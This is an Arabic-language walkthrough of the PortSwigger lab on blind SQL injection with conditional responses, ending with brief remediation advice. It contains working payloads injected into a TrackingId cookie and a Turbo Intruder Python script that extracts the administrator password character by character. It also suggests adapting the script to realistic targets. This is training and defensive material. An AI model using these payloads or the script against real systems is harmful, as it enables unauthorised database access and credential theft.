# [Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

## **`الهدف`**
قم بتنفيذ هجوم `Blind SQLi` لمعرفة كلمة مرور حساب `administrator` ثم قم بتسجيل الدخول إليه.
## **`خطوات الحل`**
**`ملاحظة:`** خطوات الحل الرسمي من الـ `PortSwigger` تختلف قليلًا عن الخطوات المكتوبة هنا لأنه يستعمل أداة `Burp Intruder`.

بمجرد الدخول إلى صفحة الموقع سنقوم بتحويل الطلب الرئيسي للدخول للموقع إلى `Repeater`

```http
GET / HTTP/2
Host: 0ae6009704e03412802344260080005b.web-security-academy.net
Cookie: TrackingId=kbWloDwhHzqKzTP6; session=hVpy2D31aqRq1uUvsCarzuA1p5bamAPP
```
بعد ذلك سنلاحظ أن كلمة `Welcome back!` يتم عرضها داخل اللاب، ومع فحص الـ `Cookie`  سنجد الـ `TrackingId`.

لذلك سنبدأ اختبار وجود ثغرة `SQLi` عمياء عن طريق حقن أوامر استعلام مثل:
```sql
kbWloDwhHzqKzTP6' AND '1'='1
kbWloDwhHzqKzTP6' AND '1'='2
```
وسنجد أن عبارة `Welcome back!` تظهر في الاستجابة في شرط `'1'='1` فقط.

**`ملاحظة جانبية:`** يمكن استعمال الاستعلامات التالية لتحديد الطول الدقيق لكلمة المرور قبل بدأ التخمين، ولكنها خطوة إختيارية إلى حد ما.
```sql
kbWloDwhHzqKzTP6' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a

kbWloDwhHzqKzTP6' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
```

ثم سنقوم بحقن أوامر استعلام لسحب كلمة مرور حساب `administrator`، وهذه الخطوة يمكن القيام بها يدويًا أو بسكريبت بايثون خارجي أو عن طريق `Burp Intruder`  أو عن طريق إضافة `Turbo Intruder` وهي الذي استخدمتها هنا.

فكل ما سنفعله هو حقن هذا الاستعلام في الـ `TrackingId` داخل `Inspector`  ليصبح كالتالي:
```sql
kbWloDwhHzqKzTP6' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), 1, 1) = 'm
```

ثم سنقوم بتحويل الطلب إلى `Turbo Intruder`
```http
GET / HTTP/2
Host: 0ae6009704e03412802344260080005b.web-security-academy.net
Cookie: TrackingId=kbWloDwhHzqKzTP6'%20AND%20SUBSTRING((SELECT%20Password%20FROM%20Users%20WHERE%20Username%20%3d%20'administrator')%2c%201%2c%201)%20%3d%20'm; session=hVpy2D31aqRq1uUvsCarzuA1p5bamAPP
```

وسنقوم بإستعمال سكريبت `Python` التالي، والذي سيقوم بتجربة جميع الحروف الكابيتال والسمول وجميع الأرقام بحد أقصى كلمة مرور تتكون من `25` محرف `Characters`، وسيقوم بطباعة الطلبات التي تكون استجابتها بها عبارة `Welcome back!` فقط.

**`ملاحظة هامة جدًا:`** سنقوم بوضع علامة `%s` مرتين، إحداهما بدلًا من الحرف والأخرى بدلًا من الرقم الأول، ولكن خذ حذرك لكي لا تحذف شئ بالخطأ أو تقوم بوضع العلامة بمكان خاطئ لأنك ستقوم بتعديل الـ `Cookie` وقد تم تحويله إلى `URL Encoding`، وفي نفس الوقت علامتي الـ `%s` لا يجب عمل `URL Encoding` لهما.
``` Python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3,
                           requestsPerConnection=20,
                           pipeline=False)

    # Define characters to loop through
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    
    # Loop through positions and characters natively
    for position in range(1, 25):
        for char in chars:
            # Pass both variables directly to the engine to replace the placeholders
            engine.queue(target.req, [str(position), char])

def handleResponse(req, interesting):
    # Filter and display successful responses
    if "Welcome back!" in req.response:
        table.add(req)
```

**`ملاحظة:`** يمكن تعديل جزئية بسيطة في السكريبت ليناسب سيناريو واقعي حيث يقوم بالبحث عن جميع الحروف والأرقام والمسافة والعلامات الخاصة.
```Python
# Expanded character set including lowercase, uppercase, numbers, spaces, and special symbols

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !@#$%^&*()_+-=[]{}|;':\",./<>?"
```

ثم سنقوم بتجميع الحروف من الاستجابات بالترتيب حتى نحصل على كلمة المرور كاملة `8pinn5gab2be40lntj0b`، ثم نقوم بتسجيل الدخول إلى حساب `administrator` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](./SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data.md)

ولكن بتعديل بسيط في النقطة الثانية من الترقيع حيث ستصبح:
ويجب التحقق من مدخلات المستخدم ومطابقتها مع قائمة بيضاء محددة مسبقا قبل تمريرها إلى قاعدة البيانات، وبما أن قيمة الـ `TrackingId` داخل الـ `Cookie` تكون معروفة الهيكلة وتتكون فقط من حروف وأرقام `Alphanumeric` وبطول ثابت، فيجب ألا يتم قبول أي مدخل يخرج عن هذا النطاق مثل احتوائه على علامات اقتباس أو رموز خاصة أو بطول أكبر من المُحدد، ويقوم التطبيق برفض الطلب فوراً إذا كان المدخل غير صالح.
